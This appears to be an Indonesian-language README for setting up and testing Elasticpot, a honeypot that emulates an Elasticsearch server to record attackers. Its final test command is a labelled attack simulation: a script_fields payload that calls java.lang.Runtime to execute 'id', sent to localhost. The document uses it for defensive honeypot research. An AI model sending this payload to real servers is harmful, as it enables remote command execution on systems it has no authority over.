# elasticpot
- [https://gitlab.com/bontchev/elasticpot](https://gitlab.com/bontchev/elasticpot)

Elasticsearch adalah search engine (mesin pencari) dan analytics engine yang berbasis Apache Lucene.

Sederhananya:
- ➡️ Elasticsearch bisa menyimpan, mencari, dan menganalisis data dalam jumlah besar dengan sangat cepat.

> Secara spesifik, Elasticpot meniru (emulasi) sebuah instance Elasticsearch (database pencarian berbasis Lucene yang populer) yang berjalan di port default 9200.

### Tujuannya:
- Membuat penyerang percaya bahwa ia menemukan server Elasticsearch yang terbuka.
- Merekam semua interaksi: query, exploit attempt, bahkan payload berbahaya.
- Memberikan informasi bagi peneliti keamanan tentang cara kerja attacker.

## setup
### setup manual
```bash
sudo apt update
sudo apt install -y pkg-config libmysqlclient-dev build-essential

git clone https://gitlab.com/bontchev/elasticpot
cd elasticpot

python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt

pip install "twisted<21" # fix deprected

python3 elasticpot.py
```

### setup with docker (msh error)
```bash
docker build -t elasticpot .
```

## testing
```bash
curl http://127.0.0.1:9200/ # Query root endpoint

# Pencarian global
curl -X POST "http://127.0.0.1:9200/_search" \
     -H 'Content-Type: application/json' \
     -d '{"query": {"match_all": {}}}'

# Simulasi insert dokumen
curl -X POST "http://127.0.0.1:9200/users/_doc/1" \
     -H 'Content-Type: application/json' \
     -d '{"name": "Budi", "age": 25, "hobby": "futsal"}'

# Query dengan filter
curl "http://127.0.0.1:9200/users/_search?q=hobby:futsal"

# Simulasi eksploitasi (contoh attacker)
curl -X POST "http://127.0.0.1:9200/_search" \
     -H 'Content-Type: application/json' \
     -d '{"size":1,"script_fields":{"poc":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")"}}}'
```
